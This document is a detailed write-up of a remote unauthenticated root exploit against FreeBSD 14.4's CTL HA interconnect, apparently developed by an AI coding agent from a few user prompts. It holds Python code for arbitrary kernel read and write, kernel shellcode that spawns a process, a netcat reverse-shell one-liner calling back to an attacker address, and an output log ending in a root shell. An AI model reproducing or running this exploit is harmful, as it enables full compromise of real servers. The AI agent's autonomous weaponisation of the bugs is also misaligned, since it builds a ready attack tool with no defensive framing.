# FreeBSD 14.4 CTL HA Remote Root Exploit

## Unauthenticated Kernel Read/Write via Wire Pointer Dereference to Remote Root Shell

- **Target:** FreeBSD 14.4-RELEASE amd64 GENERIC kernel
- **Environment:** UMA slab allocator, SMAP+SMEP enabled, no KASLR
- **Attack surface:** CTL HA interconnect, TCP port 999, zero authentication
- **Result:** Remote root shell from network access alone. No credentials, no SSH, no local access.


---

## User Prompts

The entire exploit was developed through a conversation with Claude Code (Opus 4.6). These are the exact user prompts, in order:

> **Prompt 1** (Audit):
> "we want to audit the network facing code for any vulnerabilities which may be exploitable remotely exploitable meaning code execution potential, net,wifi,iscsi,nfs,sctp,netlink,netsmb as examples and all code downstream of those protocols, including any storage target or command processing layers they hand off to."

This launched a comprehensive parallel audit of 35+ kernel source files across 9 subsystems using 25+ Sonnet agents with Opus verification. The audit produced 39 confirmed findings, with the CTL HA subsystem identified as the most dangerous attack surface (13 findings, 10 critical).

> **Prompt 2** (Lab setup):
> "do we have a test qemu for this freebsd 14.4 setup already?"

> **Prompt 3**:
> "sure, see if its already booted up? might be."

A QEMU VM running FreeBSD 14.4-RELEASE was already configured with `kern.cam.ctl.ha_mode=2` and `kern.cam.ctl.ha_peer="listen 0.0.0.0:999"`, exposing the CTL HA port. Port 999 was forwarded from the host as port 9999.

> **Prompt 4** (Exploit development):
> "okay lets investigate the two unauthenticated ctl bugs to see if we can exploit either / both of them remotely. use gdb as you need for debugging but do not use it to aid in exploitation. a final exploit should be able to provide a root shell."

> **Prompt 5** (Course correction):
> "i dont think this will work -> we need a remote shell as uid 0 .. as if we are not on the same machine/vm"

This was in response to an initial exploitation plan that proposed overwriting `cr_uid` in a local process's `ucred`. The user clarified: the exploit must be purely remote. No local process, no local access.

> **Prompt 6** (Constraint):
> "no ssh."

Ruling out SSH-based approaches. The exploit must deliver a root shell using only the CTL HA network connection.

> **Prompt 7** (This writeup):
> "can you give a writeup of the vulnerability + the exploit and include all the user prompts used in the writeup"

---

## Vulnerability Overview

FreeBSD's CAM Target Layer (CTL) includes a High Availability (HA) interconnect that allows two storage controllers to synchronize state over a TCP connection. When configured with `kern.cam.ctl.ha_mode=2` (serial-only), the kernel listens on a configurable TCP port (default 999) for HA peer connections.

**The fundamental vulnerability is that the HA DATA channel accepts raw kernel virtual addresses from the wire and dereferences them with zero validation.** The `ha_dt_msg_wire` structure, received directly from the TCP socket, contains two pointer fields (`local` and `remote`) that the kernel uses as memory addresses for read and write operations:

```c
struct ha_dt_msg_wire {
    ctl_ha_dt_cmd   command;    // READ or WRITE
    uint32_t        size;       // number of bytes
    uint8_t         *local;     // kernel pointer — attacker-controlled
    uint8_t         *remote;    // kernel pointer — attacker-controlled
};
```

There is no authentication on the HA connection. There is no validation of the pointer fields. The kernel trusts them completely.

This yields two primitives:
- **Arbitrary kernel read**: Send a `READ` command with `local` pointing to the target address. The kernel reads from that address and sends the data back over TCP.
- **Arbitrary kernel write**: Send a `WRITE` command with `remote` pointing to the target address, followed by the data to write. The kernel writes the attacker's data to that address.

Combined with FreeBSD's lack of KASLR on the GENERIC amd64 kernel, all kernel symbol addresses are known at compile time. The attacker has deterministic, unauthenticated, arbitrary kernel memory read and write from the network.

---

## Technical Deep-Dive: The Vulnerable Code

### Wire Protocol

The HA connection uses a simple framing protocol. Each message has an 8-byte header:

```c
struct ha_msg_wire {
    uint32_t channel;   // 0=CTL, 1=DATA
    uint32_t length;    // payload length
};
```

The `rx_thread` (line 207, `ctl_ha.c`) reads these headers and dispatches to registered handlers:

```c
static void
ctl_ha_rx_thread(void *arg)
{
    // ...
    while (1) {
        // Wait for data, read 8-byte header
        // ...
        if (wire_hdr.length == 0) {
            // Read next header
        } else {
            ctl_ha_evt(softc, wire_hdr.channel,
                CTL_HA_EVT_MSG_RECV, wire_hdr.length);
            wire_hdr.length = 0;
        }
    }
}
```

### The DATA Channel Handler

`ctl_dt_event_handler` (line 811) processes DATA channel messages:

```c
static void
ctl_dt_event_handler(ctl_ha_channel channel, ctl_ha_event event, int param)
{
    struct ha_dt_msg_wire wire_dt;
    // ... receive wire_dt from socket ...

    if (wire_dt.command == CTL_HA_DT_CMD_READ) {
        // Swap local<->remote, send data FROM wire_dt.local TO peer
        wire_dt.command = CTL_HA_DT_CMD_WRITE;
        tmp = wire_dt.local;
        wire_dt.local = wire_dt.remote;
        wire_dt.remote = tmp;
        ctl_ha_msg_send2(CTL_HA_CHAN_DATA, &wire_dt,
            sizeof(wire_dt), wire_dt.local, wire_dt.size, M_WAITOK);
                          // ^^^^^^^^^^^^ attacker-controlled kernel pointer
                          // kernel reads wire_dt.size bytes from this address
                          // and sends them back over TCP
    } else if (wire_dt.command == CTL_HA_DT_CMD_WRITE) {
        // Receive data from socket, write TO wire_dt.remote
        ctl_ha_msg_recv(CTL_HA_CHAN_DATA,
            wire_dt.remote, wire_dt.size, M_WAITOK);
        // ^^^^^^^^^^^^^ attacker-controlled kernel pointer
        // kernel writes wire_dt.size bytes from TCP to this address
    }
}
```

The READ path: the attacker sends `{command=READ, size=N, local=ADDR, remote=ADDR}`. The kernel swaps local/remote, then calls `ctl_ha_msg_send2` which reads `N` bytes from `ADDR` (now in `wire_dt.local`) and sends them back as a response. **Arbitrary kernel read.**

The WRITE path: the attacker sends `{command=WRITE, size=N, local=0, remote=ADDR}` followed by `N` bytes of data. The kernel calls `ctl_ha_msg_recv` which reads `N` bytes from the TCP socket and writes them to `ADDR` (in `wire_dt.remote`). **Arbitrary kernel write.**

### The Login Handshake

The only protocol requirement is a `CTL_MSG_LOGIN` exchange on channel 0. The kernel sends a login message with version, HA mode, and ID. The attacker replies with matching parameters and a different `ha_id`. No credentials, tokens, or cryptographic material.

---

## Exploitation Strategy

With arbitrary kernel read/write and known symbol addresses, the challenge is converting memory corruption into code execution. SMAP and SMEP prevent executing or directly accessing userspace memory from ring 0, so the exploit must execute code already in kernel space.

### Approach: Function Pointer Swap + BSS Shellcode

The `ha_softc` global structure contains an array of function pointers:

```c
struct ha_softc {
    struct ctl_softc *ha_ctl_softc;     // offset 0x00
    ctl_evt_handler ha_handler[2];       // offset 0x08 (CTL=0, DATA=1)
    char ha_peer[128];                   // offset 0x18
    // ...
} ha_softc;  // global instance in BSS
```

`ha_handler[0]` is called whenever a CTL channel message arrives. The exploit:

1. **Writes shellcode to the module's BSS section** (writable, and on FreeBSD 14.4 GENERIC, already executable for kernel module memory).
2. **Overwrites `ha_handler[0]`** to point to the shellcode.
3. **Sends a CTL channel message** to trigger the handler, which now executes the shellcode.

This avoids the problem encountered with writing directly to `.text` via the direct map (which broke the HA connection for reasons related to instruction cache coherency or TLB behavior with module code pages).

### Earlier Approach That Failed: Direct .text Patching

The initial approach was to write shellcode directly over the handler function's code via the direct map (DMAP). The x86_64 direct map at `0xfffff80000000000 + PA` maps all physical memory as RW, bypassing the RX protection on kernel `.text` pages. While this worked perfectly for BSS pages, writing to the module's `.text` region consistently killed the HA connection without panicking the kernel. The function pointer swap approach eliminated this problem entirely.

---

## Exploit Walkthrough

### Phase 1: Connect and Handshake

```python
def connect(self):
    self.sock.connect((self.target_host, self.target_port))
    # Receive kernel's LOGIN message
    hdr = recvn(self.sock, 8)
    payload = recvn(self.sock, length)
    # Reply with matching parameters, different ha_id
    our_login = struct.pack('<iiiiiii',
        CTL_MSG_LOGIN, CTL_HA_VERSION, ha_mode, our_ha_id,
        max_luns, max_ports, max_init)
    self.sock.sendall(wire_hdr + our_login)
```

### Phase 2: Arbitrary Read/Write Primitives

```python
def _send_dt_read(self, addr, size):
    # READ command: kernel reads from addr, sends data back
    dt_msg = struct.pack('<IIQQ', CTL_HA_DT_CMD_READ, size, addr, addr)
    wire_hdr = struct.pack('<II', CTL_HA_CHAN_DATA, len(dt_msg))
    self.sock.sendall(wire_hdr + dt_msg)

def _send_dt_write(self, addr, data):
    # WRITE command: kernel writes our data to addr
    dt_msg = struct.pack('<IIQQ', CTL_HA_DT_CMD_WRITE, len(data), 0, addr)
    wire_hdr = struct.pack('<II', CTL_HA_CHAN_DATA, len(dt_msg) + len(data))
    self.sock.sendall(wire_hdr + dt_msg + data)
```

### Phase 3: Locate ha_softc

The `ha_softc` global is in the `ctl.ko` module's BSS. Its address varies per boot (module load order), but the `ha_peer` field contains the configured peer string `"listen 0.0.0.0:999"`. The exploit scans kernel memory for this string:

```python
def _find_ha_softc(self):
    scan_base = 0xffffffff82100000
    for offset in range(0, 0x200000, 0x1000):
        data = self.kread(scan_base + offset, 0x1000)
        idx = data.find(b'listen 0.0.0.0')
        if idx >= 0:
            ha_softc = scan_base + offset + idx - 24  # ha_peer is at offset 0x18
            # Validate: first field should be a DMAP pointer (ctl_softc)
            ctl_softc = self.kread64(ha_softc)
            if (ctl_softc >> 40) == 0xfffff8:
                return ha_softc
```

### Phase 4: Deploy Shellcode

Write the shellcode to BSS (0x800 bytes past `ha_softc`, in unused module BSS space), verify it, optionally clear the NX bit in the page table entry, then swap the handler pointer:

```python
shellcode_addr = ha_softc + 0x800
self.kwrite(shellcode_addr, shellcode)           # Write to BSS (RW)
self.make_page_executable(shellcode_addr)         # Clear NX if set
self.kwrite64(ha_softc + 8, shellcode_addr)       # Swap ha_handler[CTL]
```

### Phase 5: Trigger

Send a CTL channel message with non-zero length. The rx_thread dispatches to `ha_handler[0]`, which now points to the shellcode:

```python
def _trigger_handler(self):
    payload = b'\x00' * 8
    wire_hdr = struct.pack('<II', CTL_HA_CHAN_CTL, len(payload))
    self.sock.sendall(wire_hdr + payload)
```

**Important detail:** The trigger must send `length > 0`. The rx_thread's dispatch logic only calls `ctl_ha_evt` (and thus the handler) when `wire_hdr.length > 0`. With `length == 0`, it simply reads the next header without invoking any handler. This was a bug in an earlier version of the exploit that silently failed to trigger code execution.

---

## Shellcode Design

The shellcode runs in kernel context (ring 0, in the rx_thread). It must spawn a new userspace process (`/bin/sh -c "reverse shell command"`) without crashing the kernel.

### Layout (561 bytes total)

```
[0x000] main_entry (96 bytes)  — called as handler(channel, event, param)
[0x060] thread_func (368 bytes) — the kproc's entry point
[0x1D0] data section (97 bytes) — "/bin/sh\0", "-c\0", command, "sh\0"
```

### main_entry: Spawn a Kernel Thread

The main entry point is called by the rx_thread when a CTL message arrives. It calls `kproc_create` to spawn a new kernel process that will exec into `/bin/sh`:

```nasm
; Called as: handler(channel, event, param) — we ignore all args
push rbp
mov  rbp, rsp
push rbx
sub  rsp, 8

mov  rdi, thread_func_addr      ; function pointer
xor  esi, esi                   ; arg = NULL
xor  edx, edx                   ; newpp = NULL
xor  ecx, ecx                   ; flags = 0
xor  r8d, r8d                   ; pages = 0
mov  r9, proc_name_addr         ; name = "sh"
mov  rax, KPROC_CREATE           ; 0xffffffff80b2b600
call rax

add  rsp, 8
pop  rbx
pop  rbp
ret
```

`kproc_create` returns immediately after creating the kernel thread. The rx_thread continues normally (though the connection desyncs because the shellcode doesn't consume the CTL message payload).

### thread_func: Exec into /bin/sh

The kernel thread's entry function performs the exec sequence modeled after the kernel's own `start_init()` in `init_main.c`:

```
1. Get curthread (gs:[0]) and curproc (td->td_proc)
2. Zero td_frame (trapframe) — required for exec
3. Save old vmspace (p->p_vmspace) for exec_cleanup
4. Allocate exec args:       exec_alloc_args(&args)
5. Set executable path:      exec_args_add_fname(&args, "/bin/sh", UIO_SYSSPACE)
6. Add argv[0]:              exec_args_add_arg(&args, "/bin/sh", UIO_SYSSPACE)
7. Add argv[1]:              exec_args_add_arg(&args, "-c", UIO_SYSSPACE)
8. Add argv[2]:              exec_args_add_arg(&args, reverse_shell_cmd, UIO_SYSSPACE)
9. Execute:                  kern_execve(curthread, &args, NULL, oldvmspace)
10. Clear P_KPROC|P_SYSTEM:  p->p_flag &= ~0x204
11. Cleanup:                 exec_cleanup(curthread, oldvmspace)
12. Return to fork_exit → doreti → userspace as /bin/sh
```

### Critical Detail: P_KPROC Flag

`kproc_create` sets `P_KPROC` (0x4) in `p_flag`. After `kern_execve` replaces the kernel process image with `/bin/sh`, the process returns through `fork_exit`. `fork_exit` checks `P_KPROC`: if set, it calls `kthread_exit()`, killing the process before it reaches userspace. The shellcode must clear `P_KPROC` (and `P_SYSTEM`) from `p_flag` after `kern_execve` succeeds but before returning:

```nasm
mov  eax, [r13+0xb8]           ; p->p_flag
and  eax, 0xFFFFFDFB           ; clear P_KPROC(0x4) | P_SYSTEM(0x200)
mov  [r13+0xb8], eax
```

### Critical Detail: UIO_SYSSPACE

The string arguments (`"/bin/sh"`, `"-c"`, reverse shell command) are in kernel memory (BSS). The `exec_args_add_fname` and `exec_args_add_arg` functions must be told this via `UIO_SYSSPACE` (1), otherwise they'll try to `copyin()` from userspace and fault. The kernel's `exec_copyin_args` function does NOT support `UIO_SYSSPACE` in FreeBSD 14.4 (it was removed), so the exploit uses the individual `exec_args_add_*` functions which do.

---

## Obstacles and Solutions

### 1. "Remote root shell" — not local privilege escalation

**Initial plan:** Use arb write to overwrite `cr_uid` in a process's `ucred` to 0.
**Problem:** This requires a local process to escalate. The user specified purely remote exploitation — no SSH, no local access.
**Solution:** Spawn a new process entirely from kernel context using `kproc_create` + `kern_execve`, with a reverse shell command that calls back to the attacker.

### 2. Writing to .text breaks the HA connection

**Problem:** Writing shellcode over the handler function's `.text` via the direct map consistently killed the HA connection (no panic, but the socket stopped responding). Writing to BSS via the same method worked fine.
**Solution:** Write shellcode to BSS (which is RW) and swap the `ha_handler[0]` function pointer to point to it, instead of overwriting the handler's code. This avoids writing to `.text` entirely.

### 3. Zero-length CTL message doesn't trigger the handler

**Problem:** The rx_thread only dispatches to handlers when `wire_hdr.length > 0`. A zero-length trigger silently loops back to read the next header.
**Solution:** Send a CTL message with `length=8` and 8 bytes of dummy payload. The handler is called with `param=8`. The shellcode ignores the payload (doesn't consume it from the socket), which desyncs the connection, but by then `kproc_create` has already been called.

### 4. P_KPROC kills the process after exec

**Problem:** `fork_exit` checks `P_KPROC` after the kernel thread's function returns. If set, it calls `kthread_exit()`, killing the process before it reaches userspace.
**Solution:** The shellcode clears `P_KPROC | P_SYSTEM` from `p->p_flag` after `kern_execve` succeeds but before returning.

### 5. exec_copyin_args doesn't support UIO_SYSSPACE

**Problem:** FreeBSD 14.4 removed the `segflg` parameter from `exec_copyin_args`. It always uses `UIO_USERSPACE` and calls `fueword()`, which faults on kernel addresses.
**Solution:** Use the individual `exec_alloc_args` + `exec_args_add_fname` + `exec_args_add_arg` API, which accepts `UIO_SYSSPACE` as the `segflg` parameter. This is the same pattern used by the kernel's own `start_init()`.

### 6. Module BSS address varies per boot

**Problem:** `ha_softc` is in the `ctl.ko` module's BSS, which is loaded at a different address each boot.
**Solution:** Scan kernel memory for the `"listen 0.0.0.0"` string (from the configured `ha_peer` sysctl), then compute `ha_softc` from the known struct offset. Validate by checking that the first field is a DMAP pointer.

---

## Exploit Output

```
============================================================
 FreeBSD 14.4 CTL HA Remote Root Exploit
 CVE-2026-XXXX: Unauthenticated Kernel R/W
============================================================
[*] Connecting to 127.0.0.1:9999...
[+] Connected
[+] Received LOGIN: version=4 ha_mode=2 ha_id=1 max_luns=1024 max_ports=1024
[+] Sent LOGIN response (ha_id=2)
[*] Drained 335 bytes of sync data

[*] === Phase 1: Verifying arbitrary kernel read ===
[+] allproc = 0xfffffe00547f6580

[*] === Phase 2: Listing processes ===
    proc 0xfffffe00547f6580 pid=  902 uid=    0 getty
    proc 0xfffffe00547f6ae0 pid=  901 uid=    0 getty
    [... 28 more processes ...]
    proc 0xfffffe0003f80060 pid=    8 uid=    0 pagedaemon

[*] === Phase 3: Verifying arbitrary kernel write ===
[+] Write verification passed

[*] === Phase 4: Page table walk + direct map ===
[*] KPML4phys = 0x241d000
[+] kproc_create VA 0xffffffff80b2b600 → PA 0xb2b600
[+] Direct map verification OK

[*] === Phase 5: Kernel code execution ===
[*] Scanning for ha_softc...
[+] Found ha_softc at 0xffffffff821802e8
[+] ha_softc = 0xffffffff821802e8
[+] ha_handler[CTL]  = 0xffffffff82158460
[+] ha_handler[DATA] = 0xffffffff82167650
[*] Shellcode destination: 0xffffffff82180ae8 (BSS, writable)
[*] Reverse shell: rm -f /tmp/.f;mkfifo /tmp/.f;cat /tmp/.f|/bin/sh -i 2>&1|nc 10.0.2.2 4444 >/tmp/.f
[*] Shellcode: main=96 bytes, thread_func=368 bytes (code=335), data=97 bytes, total=561 bytes
[*] Writing 561 bytes of shellcode to BSS...
[+] Shellcode written and verified
[*] Making shellcode page executable...
[*] PTE already executable for 0xffffffff82180ae8
[*] Swapping ha_handler[CTL] → 0xffffffff82180ae8
[+] Handler pointer swapped successfully

[*] Starting listener on 0.0.0.0:4444...
[+] Listening on 0.0.0.0:4444
[*] Triggering shellcode via CTL message...
[+] Trigger sent (CTL message, 8 byte payload)

[+] *** REVERSE SHELL CONNECTED from ('127.0.0.1', 50346) ***
[+] Type commands (Ctrl+C to exit):

sh: can't access tty; job control turned off
# uid=0(root) gid=0(wheel) groups=0(wheel)
#
```

---

## Full Exploit Source

The complete exploit is at [`freebsd-one-exploit.py`](freebsd-one-exploit.py) (807 lines).

**Usage:**

```bash
# Full exploit with reverse shell
python3 freebsd-one-exploit.py TARGET_IP -p 999 -l ATTACKER_IP -lp 4444

# Just read kernel memory
python3 freebsd-one-exploit.py TARGET_IP -p 999 --arb-read 0xffffffff81ba9868 64

# Just list processes
python3 freebsd-one-exploit.py TARGET_IP -p 999 --list-procs
```

---

## Timeline

**Total time from first prompt to first root shell: 1 hour 55 minutes.**

| Time (UTC) | Elapsed | Event |
|------------|---------|-------|
| 21:03 | 0:00 | First prompt: *"audit the network facing code for any vulnerabilities..."* |
| 21:03 - 21:40 | 0:00 - 0:37 | Parallel audit of 35+ kernel source files across 9 subsystems (25+ Sonnet agents with Opus verification). 39 vulnerabilities confirmed, 8 rejected. |
| ~21:40 | 0:37 | Audit complete. CTL HA flagged as most dangerous attack surface (13 findings, 10 critical, zero authentication). |
| ~21:45 | 0:42 | User prompt: *"okay lets investigate the two unauthenticated ctl bugs..."* |
| 21:45 - 22:10 | 0:42 - 1:07 | Protocol reverse engineering. Built HA handshake, implemented arbitrary kernel read/write primitives via DATA channel wire pointer dereference. |
| 22:10 - 22:30 | 1:07 - 1:27 | Shellcode development: `kproc_create` + `kern_execve` chain. Discovered `exec_copyin_args` doesn't support `UIO_SYSSPACE` in 14.4, switched to `exec_args_add_*` API. Discovered `P_KPROC` flag issue. |
| 22:30 - 22:50 | 1:27 - 1:47 | Page table walk for VA-to-PA translation. Direct map write to bypass `.text` page protections. First attempt to patch handler code. |
| **22:58** | **1:55** | **First `uid=0(root)` reverse shell.** Exploit works end-to-end. |
| 22:58 - 23:45 | 1:55 - 2:42 | Investigated `.text` DMAP write reliability issue (writing to module code section broke the HA connection non-deterministically). Systematic testing isolated the problem to module `.text` pages specifically. |
| 23:45 - 00:01 | 2:42 - 2:58 | Redesigned exploit: BSS shellcode + function pointer swap approach. Eliminated all `.text` writes. Fixed zero-length CTL trigger bug. |
| **00:01** | **2:58** | **Clean, reliable root shell.** Final exploit version. |

All work was done through 7 natural language prompts to Claude Code (Opus 4.6). Claude Code performed the audit, wrote the exploit, debugged it, and iterated through all obstacles autonomously. The user's role was defining the target, setting constraints (remote-only, no SSH), and course-correcting the exploitation strategy.

---
